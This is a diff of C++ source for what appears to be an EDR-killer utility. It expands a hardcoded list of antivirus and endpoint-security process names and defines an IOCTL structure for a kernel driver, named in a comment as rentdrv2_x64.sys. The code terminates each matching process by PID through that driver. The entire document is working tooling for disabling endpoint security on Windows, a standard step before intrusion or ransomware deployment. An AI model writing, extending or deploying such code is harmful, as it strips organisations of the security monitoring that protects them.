@@ -1,4 +1,3 @@
-
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <Windows.h>
@@ -17,49 +16,20 @@
 const char* g_serviceName = "sys-mon";
 
 const char* const g_avedrlist[] = {
-	"activeconsole",    "anti malware",         "anti-malware",       "antimalware",
-	"anti virus",       "anti-virus",           "antivirus",          "appsense",
-	"authtap",          "avast",                "avecto",             "canary", "carbonblack",
-	"carbon black",     "cb.exe",               "ciscoamp",           "cisco amp",
-	"countercept",      "countertack",          "cramtray",           "crssvc",
-	"crowdstrike",      "csagent",              "csfalcon",           "csshell",
-	"cybereason",       "cyclorama",            "cylance",            "cyoptics",
-	"cyupdate",         "cyvera",               "cyserver",           "cytray",
-	"darktrace",        "defendpoint",          "defender",           "eectrl",
-	"elastic",          "endgame",              "f-secure",           "forcepoint",
-	"fireeye",          "groundling",           "GRRservic",          "inspector",
-	"ivanti",           "kaspersky",            "lacuna",             "logrhythm",
-	"malware",          "mandiant",             "mcafee",             "morphisec",
-	"msascuil",         "msmpeng",              "nissrv",             "omni",
-	"omniagent",        "osquery",              "palo alto networks", "pgeposervice",
-	"pgsystemtray",     "privilegeguard",       "procwall",           "protectorservic",
-	"qradar",           "redcloak",             "secureworks",        "securityhealthservice",
-	"semlaunchsv",      "sentinel",             "sepliveupdat",       "sisidsservice",
-	"sisipsservice",    "sisipsutil",           "smc.exe",            "smcgui",
-	"snac64",           "sophos",               "splunk",             "srtsp",
-	"symantec",         "symcorpu",             "symefasi",           "sysinternal",
-	"sysmon",           "tanium",               "tda.exe",            "tdawork",
-	"tpython",          "vectra",               "wincollect",         "windowssensor",
-	"wireshark",        "threat",               "xagt.exe",           "xagtnotif.exe",
-	"mssense",          "configsecuritypolicy", "healthservice",      "monitoringhost",
-	"mpcmdrun",         "mpdlpcmd",             "msmpeng",            "nissrv",
-	"sensece",          "sensecm",              "sensecncproxy",      "senseir",
-	"sensendr",         "sensesampleuploader",  "sensesc",            "testcloudconnection"
+"activeconsole","anti malware","anti virus","anti-malware","anti-virus","antimalware","antivirus","appsense","authtap","avast","avecto","bdredline","canary","carbon black","carbonblack","cb.exe","cisco amp","ciscoamp","configsecuritypolicy","countercept","countertack","cramtray","crowdstrike","crssvc","csagent","csfalcon","csshell","cybereason","cyclorama","cylance","cyoptics","cyserver","cytray","cyupdate","cyvera","darktrace","defender","defendpoint","eectrl","elastic","endgame","epconsole","ephost","epintegrationservices","epprotectedservice","epsecurityservice","epupdateservice","f-secure","fireeye","forcepoint","groundling","GRRservic","healthservice","inspector","ivanti","kaspersky","lacuna","logrhythm","malware","mandiant","mcafee","monitoringhost","morphisec","mpcmdrun","mpdefendercoreservice","mpdlpcmd","msascuil","msmpeng","msmpeng","mssense","nissrv","nissrv","omni","omniagent","osquery","palo alto networks","pgeposervice","pgsystemtray","privilegeguard","procwall","protectorservic","qradar","redcloak","secureworks","securityhealthservice","securityhealthsystray","semlaunchsv","sensece","sensecm","sensecncproxy","senseir","sensendr","sensesampleuploader","sensesc","sentinel","sepliveupdat","sisidsservice","sisipsservice","sisipsutil","smartscreen","smc.exe","smcgui","snac64","sophos","splunk","srtsp","symantec","symcorpu","symefasi","sysinternal","sysmon","tanium","tda.exe","tdawork","testcloudconnection","threat","tpython","vectra","wincollect","windowssensor","wireshark","xagt.exe","xagtnotif.exe"
 };
 
 int g_avedrlistSize = sizeof(g_avedrlist) / sizeof(g_avedrlist[0]);
 
 typedef struct RentDrivStruct {
-
-	/*
-		1 - Kill a process by PID
-		2 - Kill a process by name
-		3 - Kill a process and childs by the parent process name
-	*/
-	UINT level; // Required field !
-	SIZE_T pid; // Optional based on level
-	wchar_t path[1024]; // Optional based on level
-
+/*
+    1 - Kill a process by PID
+    2 - Kill a process by name
+    3 - Kill a process and childs by the parent process name
+ */
+ UINT level; // Required field !
+ SIZE_T pid; // Optional based on level
+ wchar_t path[1024]; // Optional based on level
 } _RentDrivStruct, * PRentDrivStruct;
 
 
@@ -163,7 +133,9 @@ DWORD checkEDRProcesses(HANDLE hDevice) {
 				if (isInavEdrlist(exeName)) {
 					procId = (unsigned int)pE.th32ProcessID;
 
+					// rentdrv2_x64.sys
 					RentDrivStruct driverIoctl;
+					
 					driverIoctl.level = 1;
 					driverIoctl.pid = procId;
 
